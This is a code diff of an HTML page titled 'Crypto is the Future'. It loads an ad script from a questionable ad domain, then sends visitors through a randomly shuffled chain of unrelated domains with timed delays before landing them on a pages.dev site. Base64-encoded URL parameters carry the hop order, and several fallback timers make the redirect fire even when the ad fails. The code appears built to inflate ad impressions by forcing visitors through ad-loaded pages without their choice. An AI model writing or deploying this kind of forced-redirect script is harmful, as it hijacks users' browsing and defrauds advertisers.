@@ -3,16 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <title>Crypto is the Future 💰</title>
-
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-1R5CE8315F"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
+
   gtag('config', 'G-1R5CE8315F');
 </script>
-
 <style>
   body {
     background:#0a0a0a;
@@ -49,8 +48,7 @@
 
 <!-- ================= REDIRECTION CONTROL ================= -->
 <script>
-  const REDIRECTION_ENABLED = true;   // set true/false to enable/disable redirect
-  const FINAL_URL = "https://testss-3c9.pages.dev/";
+  const REDIRECTION_ENABLED =true;  // change to false to disable redirect
 </script>
 <!-- ======================================================= -->
 
@@ -60,39 +58,72 @@ src="https://sads.adsboosters.xyz/ffc8b614d688665892a7071a2a3dc5f2.js"
 data-cfasync="false"></script>
 
 <script>
-// Random delay 6–8 seconds
-function randomDelay() {
-    return 6000 + Math.floor(Math.random() * 2000);
+// ALL DOMAINS
+let domains = [
+    "https://glimmerbyte.com/",
+    "https://healthyhumansource.com/",
+    "https://eduprothink.com/",
+    "https://linkcents.com/"
+];
+
+// REMOVE CURRENT DOMAIN
+let current = window.location.origin + "/";
+domains = domains.filter(d => d !== current);
+
+// Shuffle
+function shuffle(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+    }
+    return array;
 }
 
-// Redirect only to final URL
+// Params
+let params = new URLSearchParams(window.location.search);
+let orderParam = params.get("order");
+let index = parseInt(params.get("index")) || 0;
+
+let order = orderParam ? atob(orderParam).split(",") : shuffle([...domains]);
+
+// Final page
+const finalUrl = "https://testss-3c9.pages.dev/";
+
+// Delay
+function delay() {
+    return 5000 + Math.floor(Math.random() * 2000);
+}
+
+// Redirect function
 function doRedirect() {
-    if (!REDIRECTION_ENABLED) return;
-    if (window._already_redirected) return;
-    window._already_redirected = true;
+    if (!REDIRECTION_ENABLED) return;  // stop if disabled
+
+    if (window.redirected) return;
+    window.redirected = true;
 
     setTimeout(() => {
-        window.location.href = FINAL_URL;
-    }, randomDelay());
+        if (index < order.length - 1) {
+            index++;
+            let encoded = btoa(order.join(","));
+            window.location.href = order[index] + "?order=" + encoded + "&index=" + index;
+        } else {
+            window.location.href = finalUrl;
+        }
+    }, delay());
 }
 
-// Trigger redirect after ad loads or fails
+// AD SCRIPT EVENTS
 const adScript = document.getElementById("AdsCoreLoader");
 if (adScript) {
-    adScript.onload = doRedirect;
-    adScript.onerror = doRedirect;
+    adScript.onload = () => doRedirect();
+    adScript.onerror = () => doRedirect();
 }
 
-// Strong fallback (if ad blocks / fails silently)
-setTimeout(() => {
-    if (!window._already_redirected) doRedirect();
-}, 5000);
+// FallBack
+setTimeout(() => { if (!window.redirected) doRedirect(); }, 4000);
 
-// Additional DOM fallback
 document.addEventListener("DOMContentLoaded", () => {
-    setTimeout(() => {
-        if (!window._already_redirected) doRedirect();
-    }, 4000);
+    setTimeout(() => { if (!window.redirected) doRedirect(); }, 3000);
 });
 </script>
 
